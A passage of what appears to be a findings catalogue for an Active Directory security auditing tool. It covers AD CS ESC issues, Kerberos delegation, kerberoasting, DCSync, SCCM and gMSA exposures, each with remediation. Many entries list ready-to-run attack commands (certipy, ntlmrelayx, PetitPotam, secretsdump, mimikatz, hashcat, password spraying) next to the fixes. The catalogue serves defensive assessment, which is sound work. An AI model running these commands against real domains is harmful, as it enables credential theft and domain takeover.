            "Or enforce manager approval / restrict the Enroll ACL to trusted groups only.",
        ],
    },
    "A-CertTempAnyPurpose": {
        "description": "ESC2 — template has Any Purpose EKU or no EKU restrictions and no manager approval.",
        "why": "Certificates from this template are valid for client authentication and code signing — chain to ESC3 for impersonation.",
        "remediation": [
            "Restrict EKU to required purposes (Client Authentication only for auth templates).",
            "Enable manager approval.",
        ],
    },
    "A-CertTempAgent": {
        "description": "ESC3 — Enrollment Agent template with no RA signature and no manager approval.",
        "why": "Enroll on behalf of any user without proof — typical chain: ESC3 → ESC2 → DA.",
        "exploit": [
            "certipy req -u user@domain -p pass -ca <CA> -template <agent-tmpl>",
            "certipy req -u user@domain -p pass -ca <CA> -template User -on-behalf-of 'DOMAIN\\Administrator' -pfx <agent.pfx>",
        ],
        "remediation": [
            "Require at least one RA signature on the template (msPKI-RA-Signature ≥ 1).",
            "Enable manager approval.",
        ],
    },
    "A-CertEnrollHttp": {
        "description": "ESC8 — ADCS enrollment service responds on HTTP without channel binding.",
        "why": "Relay coerced authentication (PetitPotam / DFSCoerce / PrinterBug) to /certsrv/certfnsh.asp to mint a DC certificate.",
        "exploit": [
            "impacket-ntlmrelayx -t http://<ca>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController",
            "PetitPotam.py -u '' -p '' <attacker> <dc>",
            "certipy auth -pfx dc.pfx",
        ],
        "remediation": [
            "Disable HTTP on the CA web enrollment role.",
            "Require HTTPS + EPA: IIS → /certsrv → Authentication → Windows Auth → Advanced Settings → Extended Protection = Required.",
            "Apply KB5005413 and disable NTLM for ADCS endpoints.",
        ],
    },
    "A-CertROCA": {
        "description": "ROCA-affected RSA key in a domain certificate.",
        "why": "Infineon TPM RSA keypair generation flaw — private key derivable from public modulus (CVE-2017-15361).",
        "remediation": [
            "Re-issue affected certificates with a non-ROCA crypto provider; revoke originals.",
        ],
    },
    "A-BadSuccessor": {
        "description": "A dMSA has a 'preceded by' link to another account — allows the bad-successor escalation.",
        "why": "An attacker with edit rights on the dMSA can promote it to take over the predecessor's identity and keys (Akamai 2024 disclosure).",
        "exploit": [
            "Edit msDS-DelegatedManagedServiceAccountPrecededByLink → trigger key migration → impersonate.",
        ],
        "remediation": [
            "Audit and remove preceded-by links unless explicitly required.",
            "Tighten DACLs on dMSA objects.",
        ],
    },
    # ── Privileged ─────────────────────────────────────────────────────────
    "P-AdminNum": {
        "description": "Domain Admins group has more than 5 active members.",
        "why": "Each DA is a Tier-0 credential that can fully compromise the domain — keep the set minimal and audited.",
        "remediation": [
            "Reduce DA membership to break-glass accounts only. Use delegated roles for everyday ops.",
        ],
    },
    "P-Kerberoasting": {
        "description": "Privileged accounts have SPNs registered.",
        "why": "Any domain user can request a TGS for the SPN — RC4 tickets crack to plaintext offline. Privileged kerberoast = instant DA.",
        "exploit": [
            "impacket-GetUserSPNs DOMAIN/lowpriv:pass -request -outputfile spn.hashes",
            "hashcat -m 13100 -O -a 0 spn.hashes rockyou.txt",
        ],
        "remediation": [
            "Move admins to gMSA where feasible — auto-rotated, AES-only.",
            "Set msDS-SupportedEncryptionTypes = 0x18 (AES128+AES256) on each account.",
            "Set 25+ char random passwords.",
        ],
    },
    "P-UnconstrainedDelegation": {
        "description": "Non-DC account has TRUSTED_FOR_DELEGATION (unconstrained Kerberos delegation).",
        "why": "Coerce any user/DC to authenticate to this host → cached TGT extractable from LSASS → impersonate anyone, including DA.",
        "exploit": [
            "Rubeus monitor /interval:1 /nowrap   (capture incoming TGTs)",
            "Coerce target: PetitPotam.py / SpoolSample / dfscoerce",
            "Rubeus asktgs /ticket:<base64> /service:cifs/<dc>",
        ],
        "remediation": [
            "Remove TRUSTED_FOR_DELEGATION flag (UAC bit 0x80000).",
            "Use Resource-Based Constrained Delegation or A2D2 instead.",
            "Add affected admins to Protected Users to block delegation of their TGTs.",
        ],
    },
    "P-ServiceDomainAdmin": {
        "description": "Service account (has SPN) is a member of Domain Admins.",
        "why": "Service accounts are the prime kerberoast target — DA-tier kerberoast cracks the keys to the kingdom.",
        "exploit": [
            "impacket-GetUserSPNs DOMAIN/user:pass -request -target-user <svc-da>",
            "hashcat -m 13100 spn.hash wordlist",
        ],
        "remediation": [
            "Remove DA membership; grant only the specific rights the service needs.",
            "Convert to gMSA (automatic 30-day AES password rotation).",
        ],
    },
    "P-SchemaAdmin": {
        "description": "Schema Admins group is not empty.",
        "why": "Schema changes are irreversible. Active membership is a persistent backdoor opportunity.",
        "remediation": [
            "Empty Schema Admins after schema operations; add and remove only as needed.",
        ],
    },
    "P-Delegated": {
        "description": "Privileged accounts lack the 'Account is sensitive and cannot be delegated' flag.",
        "why": "Without ADS_UF_NOT_DELEGATED, these admins' TGTs can be forwarded by any service trusted for delegation — credential theft pivot.",
        "remediation": [
            "Set-ADUser <admin> -AccountNotDelegated $true",
            "Or add them to Protected Users (recommended) which implies non-delegation + AES-only.",
        ],
    },
    "P-DCSync": {
        "description": "A non-DC principal has DS-Replication-Get-Changes / -All rights on the domain root.",
        "why": "DCSync — replicates every secret in NTDS.dit. Effectively Domain Admin without group membership.",
        "exploit": [
            "impacket-secretsdump DOMAIN/user:pass@dc -just-dc",
            "mimikatz \"lsadump::dcsync /domain:DOMAIN /all /csv\"",
        ],
        "remediation": [
            "Remove the ACE: Get-Acl 'AD:\\<domain>' | filter for 'DS-Replication-Get-Changes*' GUIDs.",
            "Audit Exchange-related groups (Exchange Trusted Subsystem can inherit DCSync via PrivExchange).",
        ],
    },
    "P-ModifiableGPO": {
        "description": "A non-admin principal can edit a GPO that targets privileged scope.",
        "why": "Edit gPCFileSysPath scripts/registry → RCE on all linked objects on next gpupdate, including DCs.",
        "exploit": [
            "SharpGPOAbuse.exe --AddUserRights 'SeDebugPrivilege' --UserAccount <attacker>",
            "Add Computer Configuration startup script → executes on every linked host.",
        ],
        "remediation": [
            "Audit GPO DACL: Get-GPPermission -All -TargetName <gpo>.",
            "Remove write access from non-admin principals.",
        ],
    },
    "P-MachineAccountQuota": {
        "description": "ms-DS-MachineAccountQuota > 0 — any authenticated user may add up to N computer accounts.",
        "why": "Required primitive for RBCD (Resource-Based Constrained Delegation) and Shadow Credentials attacks → DA from low-priv.",
        "exploit": [
            "impacket-addcomputer -computer-name 'pwn$' -computer-pass 'P@ss' DOMAIN/user:pass",
            "rbcd.py -t <victim-host> -f 'pwn' -delegate-from 'pwn$' -action write DOMAIN/user:pass",
            "getST.py -spn cifs/<victim> -impersonate Administrator DOMAIN/pwn$:P@ss",
        ],
        "remediation": [
            "Set-ADDomain -MachineAccountQuota 0 — restrict computer creation to delegated admins.",
        ],
    },
    "P-GPPPassword": {
        "description": "Group Policy Preferences cpassword found in SYSVOL — MS14-025.",
        "why": "Microsoft published the AES key. Decrypt → credential reuse domain-wide.",
        "exploit": [
            "Gpp-Decrypt <cpassword> (Empire / SharpGPP / Get-GPPPassword.ps1).",
            "Test the recovered credential with nxc smb / kerbrute.",
        ],
        "remediation": [
            "Delete every SYSVOL XML containing cpassword (Groups.xml / Services.xml / ScheduledTasks.xml / DataSources.xml / Drives.xml / Printers.xml).",
            "Treat every affected account as compromised — reset password immediately.",
            "Use LAPS for local admin password management going forward.",
        ],
    },
    "P-ProtectedUsers": {
        "description": "Privileged accounts are not members of the Protected Users group.",
        "why": "Without Protected Users, admin Kerberos tickets default to 10h, RC4 is allowed, credentials are cached — Mimikatz fodder.",
        "remediation": [
            "Add admins to Protected Users (verify gMSA / interactive logon still works on legacy systems first).",
        ],
    },
    "P-RecycleBin": {
        "description": "AD Recycle Bin is not enabled.",
        "why": "Once enabled it cannot be disabled — attackers who can disable accounts force deletion to cover tracks.",
        "remediation": [
            "Enable-ADOptionalFeature 'Recycle Bin Feature' -Scope ForestOrConfigurationSet -Target <forest>",
        ],
    },
    # ── Stale ───────────────────────────────────────────────────────────────
    "S-Kerberoastable": {
        "description": "Service accounts with SPNs are missing AES encryption types.",
        "why": "Any user can request RC4-encrypted TGS tickets and crack offline.",
        "exploit": [
            "impacket-GetUserSPNs DOMAIN/user:pass -request -outputfile spn.hashes",
            "hashcat -m 13100 -O spn.hashes rockyou.txt -r OneRuleToRuleThemAll.rule",
        ],
        "remediation": [
            "Set msDS-SupportedEncryptionTypes = 0x18 on each account (AES128 + AES256 only).",
            "Pair with strong (>25-char) passwords or convert to gMSA.",
        ],
    },
    "S-KerberoastableAdmin": {
        "description": "Kerberoastable accounts that are also members of a privileged group.",
        "why": "RC4 TGS for a Domain Admin = trivial offline crack → instant DA on success.",
        "exploit": [
            "impacket-GetUserSPNs DOMAIN/lowuser:pass -request -target-user <admin-svc>",
            "hashcat -m 13100 -O hash.txt wordlist.txt",
        ],
        "remediation": [
            "URGENT — convert to gMSA or rotate the password to 25+ random chars TODAY.",
            "Set msDS-SupportedEncryptionTypes to 0x18 AES-only.",
        ],
    },
    "S-NoPreAuth": {
        "description": "Users have DONT_REQUIRE_PREAUTH (AS-REP roastable).",
        "why": "Request an AS-REP without proving knowledge of the password — the response contains a hash crackable offline (hashcat -m 18200).",
        "exploit": [
            "impacket-GetNPUsers DOMAIN/ -no-pass -usersfile users.txt -format hashcat -outputfile asrep.hash",
            "hashcat -m 18200 -O asrep.hash rockyou.txt",
        ],
        "remediation": [
            "Clear DONT_REQUIRE_PREAUTH: Set-ADUser <user> -DoesNotRequirePreAuth $false",
        ],
    },
    "S-NoPreAuthAdmin": {
        "description": "Admin accounts have DONT_REQUIRE_PREAUTH — AS-REP roastable.",
        "why": "Same as S-NoPreAuth, but a successful crack equals a privileged credential.",
        "remediation": [
            "Disable the flag and reset the password to a long random value immediately.",
        ],
    },
    "S-PwdNotRequired": {
        "description": "Account is configured to permit logon with no password (PASSWD_NOTREQD).",
        "why": "Blank-password authentication is allowed on this account if the password is reset to empty.",
        "exploit": [
            "kerbrute passwordspray -d DOMAIN users.txt ''",
            "nxc smb <dc> -u <user> -p ''",
        ],
        "remediation": [
            "Set-ADUser <user> -PasswordNotRequired $false; force password reset.",
        ],
    },
    "S-PwdNeverExpires": {
        "description": "Enabled accounts have DONT_EXPIRE_PASSWORD.",
        "why": "Captured hashes / passwords stay valid forever — primary post-breach persistence vector.",
        "remediation": [
            "Set-ADUser <user> -PasswordNeverExpires $false (or convert to gMSA for services).",
        ],
    },
    "S-DesEnabled": {
        "description": "Accounts have USE_DES_KEY_ONLY (DES-only Kerberos).",
        "why": "DES is broken — 56-bit keyspace, hours to crack with modern GPUs.",
        "remediation": [
            "Remove the flag; enforce AES on the account.",
        ],
    },
    "S-AesNotEnabled": {
        "description": "Service accounts have no AES encryption types in msDS-SupportedEncryptionTypes.",
        "why": "Kerberos falls back to RC4 — cheap to crack from kerberoast captures.",
        "remediation": [
            "Set-ADUser <svc> -KerberosEncryptionType AES128,AES256",
        ],
    },
    "S-SIDHistory": {
        "description": "Objects have sIDHistory entries.",
        "why": "Legitimate after migrations, but also a powerful backdoor (Golden / Diamond ticket persistence) — abuse if SID filtering is off.",
        "remediation": [
            "Clear sIDHistory after migrations complete: Set-ADUser <user> -Clear sIDHistory.",
        ],
    },
    "S-OS-XP": {
        "description": "Windows XP / Server 2003 systems are present in the domain.",
        "why": "Unpatched, lack SMB signing, vulnerable to MS17-010 et al. Foothold via single share.",
        "remediation": [
            "Decommission immediately or isolate on a strict VLAN.",
        ],
    },
    "S-OS-Vista": {
        "description": "Windows Vista / Server 2008 systems are present.",
        "why": "Out of mainstream support; lack many modern hardening features.",
        "remediation": ["Upgrade or decommission."],
    },
    "S-OS-NT": {
        "description": "NT4-era systems are present.",
        "why": "Predates any modern AD security feature.",
        "remediation": ["Remove from network."],
    },
    "S-SMB-v1": {
        "description": "SMBv1 is enabled on the domain controller.",
        "why": "WannaCry / EternalBlue / NotPetya transport. SMBv1 also lacks signing and integrity protections.",
        "remediation": [
            "Disable-WindowsOptionalFeature -Online -FeatureName smb1protocol",
            "Set-SmbServerConfiguration -EnableSMB1Protocol $false",
        ],
    },
    "S-FunctionalLevel1": {
        "description": "Domain or forest functional level ≤ 2003.",
        "why": "Missing AES, Kerberos armoring, Managed Service Accounts, fine-grained password policies.",
        "remediation": ["Raise functional level (verify no legacy DCs first)."],
    },
    "S-Vuln-MS14-068": {
        "description": "DC may be vulnerable to MS14-068 PAC forgery.",
        "why": "Any domain user forges a Kerberos ticket asserting DA membership.",
        "exploit": [
            "impacket-goldenPac DOMAIN/user:pass@<dc>",
        ],
        "remediation": [
            "Install KB3011780 on every DC; verify with WUSA.",
            "Upgrade past Windows Server 2008 R2.",
        ],
    },
    "S-Vuln-MS17_010": {
        "description": "Host appears vulnerable to MS17-010 (EternalBlue).",
        "why": "Pre-auth SYSTEM RCE over SMB. Used by WannaCry / NotPetya.",
        "exploit": [
            "nxc smb <host> -M ms17-010",
            "metasploit exploit/windows/smb/ms17_010_eternalblue",
        ],
        "remediation": [
            "Patch KB4012598 (and successors) on every host.",
            "Disable SMBv1.",
        ],
    },
    "S-KerberosArmoring": {
        "description": "Domain functional level below 2012 — Kerberos FAST/armoring is unavailable.",
        "why": "Without FAST, AS-REQ pre-auth is brute-forceable; Kerberos ticket privacy is reduced.",
        "remediation": [
            "Raise DFL to 2012+, then configure 'KDC support for claims, compound authentication and Kerberos armoring' = Always provide claims on DCs.",
        ],
    },
    "S-KerberosArmoringDC": {
        "description": "DC does not require Kerberos armoring (FAST).",
        "remediation": [
            "Set 'KDC support for claims, compound authentication and Kerberos armoring' policy to 'Fail unarmored authentication requests'.",
        ],
    },
    # ── Trust ───────────────────────────────────────────────────────────────
    "T-SIDFiltering": {
        "description": "SID filtering is not enabled on the trust.",
        "why": "Allows SID-history injection across the trust — common chain for cross-domain DA.",
        "exploit": [
            "Forge inter-realm TGT with sIDHistory containing target-domain DA SID; cross trust.",
        ],
        "remediation": [
            "netdom trust <local> /domain:<remote> /quarantine:yes",
        ],
    },
    "T-TGTDelegation": {
        "description": "TGT delegation is enabled on the trust.",
        "why": "An unconstrained host in the trusted domain receives our TGTs → cross-trust credential theft.",
        "remediation": [
            "Clear the TGT_DELEGATION_ENABLED bit (0x800) from trustAttributes.",
        ],
    },
    "T-SIDHistoryDangerous": {
        "description": "An object holds a sIDHistory entry referencing a SID from a trusted domain.",
        "why": "Persistent privilege escalation primitive across the trust boundary.",
        "remediation": ["Audit and clear sIDHistory after migrations complete."],
    },
    # ── v2 additions ──────────────────────────────────────────────────────────
    "P-RBCD": {
        "description": "Accounts have msDS-AllowedToActOnBehalfOfOtherIdentity set (resource-based constrained delegation).",
        "why": "If an attacker controls (or can create, via MachineAccountQuota) any principal listed in the RBCD descriptor, they can request S4U tickets to impersonate ANY user — including Domain Admins — to the configured host.",
        "technical": "msDS-AllowedToActOnBehalfOfOtherIdentity is an ntSecurityDescriptor naming the principals permitted to delegate to this object.",
        "exploit": [
            "rbcd.py -delegate-from 'EVIL$' -delegate-to 'TARGET$' -action read 'DOMAIN/user:pass'",
            "getST.py -spn cifs/target -impersonate Administrator 'DOMAIN/EVIL$:pass'",
        ],
        "remediation": [
            "Review every RBCD entry; clear msDS-AllowedToActOnBehalfOfOtherIdentity where not required.",
            "Set ms-DS-MachineAccountQuota to 0 so low-priv users cannot add the attacker computer.",
        ],
        "refs": ["https://learn.microsoft.com/windows-server/security/kerberos/"],
    },
    "P-RBCD-Dangerous": {
        "description": "Resource-based constrained delegation is configured on a domain controller / Tier-0 object.",
        "why": "RBCD on a DC means whoever can write that descriptor — or already controls a listed principal — can impersonate any user to the DC. This is a direct path to full domain compromise.",
        "remediation": ["Immediately remove RBCD from DC objects; investigate how it was set (likely abuse)."],
    },
    "P-ConstrainedDelegService": {
        "description": "Service accounts are trusted for constrained delegation (msDS-AllowedToDelegateTo) to specific SPNs.",
        "why": "Compromising the service account lets an attacker use S4U2Proxy to access the target services as any user. With protocol transition (T2A4D / TRUSTED_TO_AUTH_FOR_DELEGATION) they can impersonate arbitrary users without their credentials.",
        "technical": "msDS-AllowedToDelegateTo lists target SPNs; userAccountControl TRUSTED_TO_AUTH_FOR_DELEGATION (0x1000000) enables protocol transition.",
        "exploit": [
            "getST.py -spn <target-spn> -impersonate Administrator 'DOMAIN/svc:pass'",
        ],
        "remediation": [
            "Minimize constrained-delegation grants; prefer RBCD scoped to specific resources.",
            "Add sensitive accounts to Protected Users and mark them 'account is sensitive and cannot be delegated'.",
        ],
    },
    "P-ComputerInPrivGroup": {
        "description": "Computer accounts are members of privileged groups (e.g. Domain Admins).",
        "why": "Anyone with SYSTEM on that machine — or its machine-account secret — inherits the group's domain privileges. Workstations are far easier to compromise than DCs, collapsing the tiering model.",
        "remediation": ["Remove computer accounts from privileged groups; grant the needed right to a dedicated service identity instead."],
    },
    "P-AdminCountOrphan": {
        "description": "Objects carry adminCount=1 but are not currently members of a protected group.",
        "why": "adminCount=1 leaves AdminSDHolder's restrictive ACL and broken inheritance on the object even after it is demoted. It signals former privilege and can hide ACL anomalies; attackers also look for these as high-value targets.",
        "technical": "AdminSDHolder stamps adminCount=1 and replaces the ACL hourly (SDProp). It is not cleared automatically when membership is removed.",
        "remediation": [
            "Verify the account is genuinely non-privileged, then set adminCount to <not set> and re-enable inheritance (dsacls /resetDefaultDACL or the AD object's 'Include inheritable permissions').",
        ],
    },
    "S-SIDHistoryPrivileged": {
        "description": "Accounts carry a privileged or built-in SID in their sIDHistory.",
        "why": "SID history is honored at logon, so the account silently wields the privileges of the referenced SID (e.g. Enterprise Admins / Administrators) without appearing in any group. A classic stealth persistence backdoor.",
        "technical": "Look for sIDHistory RIDs 512/516/518/519/520 or built-in S-1-5-32-544 etc., or any RID 500.",
        "exploit": ["Mimikatz sid::patch + sid::add to inject; the account then authenticates with hidden admin rights."],
        "remediation": [
            "Clear the offending sIDHistory values (ntdsutil / Set-ADUser -Remove).",
            "Rotate the krbtgt password twice and review how the SID was injected.",
        ],
    },
    "A-RestrictRemoteSAM": {
        "description": "No GPO enforces 'Network access: Restrict clients allowed to make remote calls to SAM' (RestrictRemoteSAM).",
        "why": "Without it, low-privileged (sometimes unauthenticated) users can enumerate local group membership and accounts via SAMR — prime recon for lateral movement and local-admin mapping (SharpHound, net rpc).",
        "technical": "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\RestrictRemoteSAM (REG_SZ, SDDL). Should allow only Administrators (O:BAG:BAD:(A;;RC;;;BA)).",
        "remediation": ["Deploy the security option with an SDDL granting only Administrators remote SAM access."],
    },
    "A-NTLMAudit": {
        "description": "NTLM auditing is not enabled via GPO.",
        "why": "You cannot safely restrict or remove NTLM without first baselining where it is used. Absent auditing, relay and pass-the-hash activity also goes unlogged.",
        "technical": "Lsa\\MSV1_0\\AuditReceivingNTLMTraffic and RestrictSendingNTLMTraffic (set to audit=1/2 first).",
        "remediation": ["Enable 'Network security: Restrict NTLM: Audit ...' policies, review logs, then progressively restrict NTLM."],
    },
    "A-DSRMLogon": {
        "description": "DsrmAdminLogonBehavior=2 — the DSRM local administrator can log on over the network.",
        "why": "The DSRM account's password is rarely rotated and its NT hash can be dumped from the DC. With network logon enabled it becomes a stealth local-admin backdoor on the domain controller.",
        "technical": "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\DsrmAdminLogonBehavior. 0/unset = console only.",
        "remediation": ["Set DsrmAdminLogonBehavior to 0; rotate the DSRM password regularly (e.g. Sync-AdamSyncFromAD / Set-ADAccountPassword on the DC in DSRM)."],
    },
    "A-CertTemplateESC4": {
        "description": "A published certificate template's ACL is writable by a low-privileged principal (ESC4).",
        "why": "Write access to a template lets an attacker reconfigure it into an ESC1 (enrollee-supplied SAN + authentication EKU, no approval) and then enroll a certificate for any user — typically a Domain Admin — and authenticate via PKINIT.",
        "technical": "Dangerous ACE (GenericAll/GenericWrite/WriteDacl/WriteOwner/WriteProperty) for Everyone/Authenticated Users/Domain Users/Computers on the pKICertificateTemplate object.",
        "exploit": [
            "certipy find -vulnerable -u user@domain -p pass",
            "certipy template -template <tmpl> -u user@domain -p pass   # weaponize to ESC1",
            "certipy req -template <tmpl> -upn administrator@domain ...  # then auth",
        ],
        "remediation": [
            "Restrict template ACLs to specific enrollment groups; remove write rights from broad principals.",
            "Enable manager approval on sensitive templates.",
        ],
    },
    "A-SCCM": {
        "description": "Microsoft Configuration Manager (SCCM/MECM) site infrastructure is published in AD.",
        "why": "SCCM is a top internal-pentest target: management points accept NTLM and are relayable (to MSSQL/site DB or SMB), Network Access Accounts (NAA) and task-sequence/PXE secrets are recoverable and often over-privileged, and the site DB or a primary site server frequently yields domain-wide admin. Site data published to AD gives an unauthenticated/low-priv attacker the server inventory to start.",
        "technical": "System Management container (CN=System Management,CN=System,<domain>) holds mSSMSManagementPoint / mSSMSSite objects (dNSHostName, mSSMSSiteCode). The container ACL grants client publishing rights.",
        "exploit": [
            "SharpSCCM.exe get site-info / get naa     # recover Network Access Account creds",
            "sccmhunter.py find -u user -p pass -d domain -dc-ip <dc>",
            "ntlmrelayx.py -t mssql://<sccm-db> -smb2support   # relay MP/site server auth",
            "PXEthief / pxethiefy   # recover task-sequence secrets from PXE",
        ],
        "remediation": [
            "Enforce SMB signing + Extended Protection on MP/site/DB servers; enable MSSQL EPA.",
            "Remove the legacy Network Access Account; use Enhanced HTTP / PKI.",
            "Require a PXE password and disable unknown-computer support where unused.",
            "Tier site servers/DB as Tier-0; restrict the System Management container ACL.",
        ],
        "refs": ["https://github.com/Mayyhem/SharpSCCM", "https://github.com/garrettfoster13/sccmhunter"],
    },
    "A-Pre2kComputer": {
        "description": "Pre-created (Pre-Windows 2000) computer accounts that still hold a predictable, name-derived password.",
        "why": "A computer account staged with 'Assign this computer account as a pre-Windows 2000 computer' gets its password set to the lowercase short host name (sAMAccountName without the trailing $). Until a real host joins, anyone can authenticate AS that computer — get a TGT, read LAPS, target RBCD/shadow-credentials, or kerberoast — from an unauthenticated position.",
        "technical": "Computer objects with logonCount=0, userAccountControl WORKSTATION_TRUST set, often PASSWD_NOTREQD, and pwdLastSet≈whenCreated. Password guess = lower(name without $).",
        "exploit": [
            "pre2k unauth -d domain.local -dc-ip <dc>          # spray default creds",
            "pre2k auth -u 'HOST$' -p host -d domain.local -dc-ip <dc>",
            "getTGT.py 'domain.local/HOST$:host'               # then act as the computer",
        ],
        "remediation": [
            "Reset or delete unused pre-staged computer accounts.",
            "Pre-stage with a random password and the correct joining identity, not the Pre-Windows 2000 option.",
        ],
        "refs": ["https://github.com/garrettfoster13/pre2k"],
    },
    "A-WeakLockout": {
        "description": "The domain (or a fine-grained policy) has no — or a very high — account-lockout threshold.",
        "why": "Without lockout, password spraying is essentially free: an attacker tries one common password against every account each observation window and rarely trips an alert. This is the single most reliable initial-access technique on internal engagements.",
        "technical": "domain lockoutThreshold = 0 (no lockout) or > 10; also check fine-grained PSOs (msDS-LockoutThreshold).",
        "exploit": [
            "nxc smb <dc> -u users.txt -p 'Season2025!' --continue-on-success",
            "kerbrute passwordspray -d domain.local users.txt 'Welcome1!'",
        ],
        "remediation": [
            "Set a lockout threshold (e.g. 5–10) with a sane observation/reset window, or deploy smart lockout / Azure password protection.",
        ],
    },
    "P-ControlPathDA": {
        "description": "Non-privileged principals can reach Domain Admin through a chain of control edges (group membership + dangerous ACLs / ownership).",
        "why": "These are the multi-hop escalation routes BloodHound surfaces — a low-privileged user who can write to a group, reset an admin's password, edit a linked GPO, or take ownership of a Tier-0 object ultimately becomes Domain Admin. They are the most common real-world DA path and are invisible to membership-only review.",
        "technical": "Transitive closure over edges: MemberOf, GenericAll/GenericWrite/WriteDacl/WriteOwner/Owner/AllExtendedRights/ForceChangePassword/Self(member) on groups, admin users, GPOs and the domain root, seeded from the Tier-0 groups.",
        "exploit": [
            "bloodhound-python -c All -u user -p pass -d domain.local -ns <dc>  # then 'Shortest paths to Domain Admins'",
            "Walk the path: e.g. dacledit (WriteDacl) → net group add (AddMember) → DCSync",
        ],
        "remediation": [
            "Remove the dangerous ACE / ownership at the first hop of each path (see the chain).",
            "Re-baseline AdminSDHolder; restrict who can write to Tier-0 objects and admin accounts.",
        ],
        "refs": ["https://bloodhound.specterops.io/"],
    },
    "P-ControlPathIndirectEveryone": {
        "description": "Everyone / Authenticated Users / Domain Users / Domain Computers has a control path to Domain Admin.",
        "why": "Any authenticated user — i.e. every employee, and anyone who phishes one set of creds — can escalate to domain takeover. This is a worst-case finding.",
        "remediation": ["Remove the broad-principal control edge at the first hop of the path immediately."],
    },
    "P-ControlPathIndirectMany": {
        "description": "An unusually large number of non-privileged principals can reach Domain Admin via control paths.",
        "why": "A wide blast radius for domain takeover — many accounts, any one of which if compromised yields DA. Indicates systemic ACL sprawl.",
        "remediation": ["Review and prune delegated rights on Tier-0 objects; collapse the control paths."],
    },
    "A-CertCAManageLowPriv": {
        "description": "A low-privileged principal holds CA management rights (ManageCA / Manage Certificates) on an enterprise CA — ESC7.",
        "why": "ManageCA lets an attacker enable the EDITF_ATTRIBUTESUBJECTALTNAME2 flag (turning every template into ESC6) or approve their own failed requests; Manage Certificates lets them issue held requests. Either yields a certificate for any user and full domain compromise.",
        "technical": "CA object (pKIEnrollmentService) nTSecurityDescriptor ACE granting ManageCA (0x1) / ManageCertificates to a non-admin.",
        "exploit": [
            "certipy ca -ca <CA> -enable-template <tmpl> ...   # or -add-officer / -issue-request",
            "certipy find -vulnerable    # confirms ESC7",
        ],
        "remediation": [
            "Remove CA management roles from non-Tier-0 principals (certsrv → CA → Security).",
        ],
        "refs": ["https://github.com/ly4k/Certipy"],
    },
    "A-CertTemplateESC9": {
        "description": "A published authentication template has CT_FLAG_NO_SECURITY_EXTENSION set — ESC9 (weak certificate mapping).",
        "why": "Without the szOID_NTDS_CA_SECURITY_EXT SID in the certificate, AD falls back to weak (UPN-based) implicit mapping. Combined with write access to a victim's userPrincipalName, an attacker enrolls a cert that authenticates as a target (incl. DAs) even after the May-2022 patches.",
        "technical": "msPKI-Enrollment-Flag has bit 0x80000 (NO_SECURITY_EXTENSION) and the template provides an authentication EKU.",
        "exploit": [
            "certipy req -template <tmpl> -upn administrator@domain ... (with UPN control)",
        ],
        "remediation": [
            "Clear CT_FLAG_NO_SECURITY_EXTENSION; enforce StrongCertificateBindingEnforcement=2 on DCs (KB5014754).",
        ],
        "refs": ["https://github.com/ly4k/Certipy"],
    },
    "A-SCCMContainerACL": {
        "description": "The System Management container (SCCM/MECM) is writable by a broad / non-Tier-0 principal.",
        "why": "Write access to the System Management container lets an attacker publish a rogue management point and coerce clients/site servers to authenticate to it (relay), or tamper with SCCM site data — a common path to SCCM, and from there domain-wide, compromise.",
        "technical": "CN=System Management,CN=System,<domain> nTSecurityDescriptor grants GenericWrite/GenericAll/WriteDacl to Everyone/Authenticated Users/Domain Users/Computers.",
        "remediation": ["Restrict the container ACL to the SCCM site server(s) only."],
        "refs": ["https://github.com/garrettfoster13/sccmhunter"],
    },
    "P-GMSAReadable": {
        "description": "A broad / low-privileged principal can read the managed password of a gMSA or dMSA.",
        "why": "msDS-GroupMSAMembership controls who may retrieve msDS-ManagedPassword. If a non-Tier-0 principal is listed, they can read the gMSA/dMSA's current password (a derived NT hash / AES keys) and authenticate as that account — which is frequently highly privileged (SQL, AD CS, Exchange, scheduled tasks).",
        "technical": "msDS-GroupMSAMembership (PrincipalsAllowedToRetrieveManagedPassword) DACL grants read to a broad SID (Everyone / Authenticated Users / Domain Users / Domain Computers / BUILTIN\\Users).",
        "exploit": [
            "nxc ldap <dc> -u user -p pass --gmsa",
            "certipy/gMSADumper.py -u user -p pass -d domain -l <dc>",
            "Use the recovered NT hash with pass-the-hash / getTGT.py.",
        ],
        "remediation": [
            "Restrict msDS-GroupMSAMembership to the specific hosts/service identities that need the account.",
        ],
        "refs": ["https://github.com/micahvandeusen/gMSADumper"],
    },
    "A-KDSRootKey": {
        "description": "A broad / low-privileged principal is granted read on the KDS root key.",
        "why": "With the KDS root key an attacker computes the password of ANY gMSA in the forest offline (GoldenGMSA), with no further DC interaction — persistent access to every managed service account. Only Domain Admins / SYSTEM should ever read it.",
        "technical": "CN=Master Root Keys,CN=Group Key Distribution Service,CN=Services,CN=Configuration — nTSecurityDescriptor DACL grants read (GenericAll/GenericRead/ReadProperty/Control-Access) to a broad SID (Everyone / Authenticated Users / Domain Users / Domain Computers / BUILTIN\\Users).",
        "exploit": [
            "GoldenGMSA.exe kdsinfo / gmsainfo / compute --sid <gmsa-sid>",
        ],
        "remediation": [
            "Treat KDS root keys as Tier-0; verify only Domain Admins/SYSTEM can read CN=Master Root Keys and investigate the delegation that exposed it.",
        ],
        "refs": ["https://github.com/Semperis/GoldenGMSA"],
    },
    "A-AADConnectSync": {
        "description": "An Entra/Azure AD Connect synchronization account (MSOL_*) is present in the domain.",
        "why": "The on-prem AAD Connect sync account is granted directory-replication (DCSync) rights to support Password Hash Sync. Compromising the AD Connect server (or this account) yields DCSync — full credential extraction — and a pivot between on-prem AD and Entra ID.",
        "technical": "User accounts named MSOL_<hex> (default AAD Connect naming). The AD Connect server stores the account's credentials in a recoverable form (DPAPI).",
        "exploit": [
            "On the AAD Connect host: AADInternals Get-AADIntSyncCredentials → recover MSOL_ password.",
            "impacket-secretsdump 'DOMAIN/MSOL_xxx:pass@dc' -just-dc",
        ],
        "remediation": [
            "Tier-0 the AD Connect server and the MSOL_ account; restrict logon; monitor its DCSync usage.",
        ],
        "refs": ["https://aadinternals.com/post/on-prem_admin/"],
    },
    "A-SeamlessSSO": {
        "description": "The Entra Seamless SSO computer account AZUREADSSOACC$ has a stale Kerberos key.",
        "why": "AZUREADSSOACC$ holds the key that signs Seamless SSO Kerberos tickets to Entra ID. Microsoft recommends rotating it every 30 days; a stale key lets an attacker who recovers it forge silver tickets to authenticate to Entra as any synced user.",
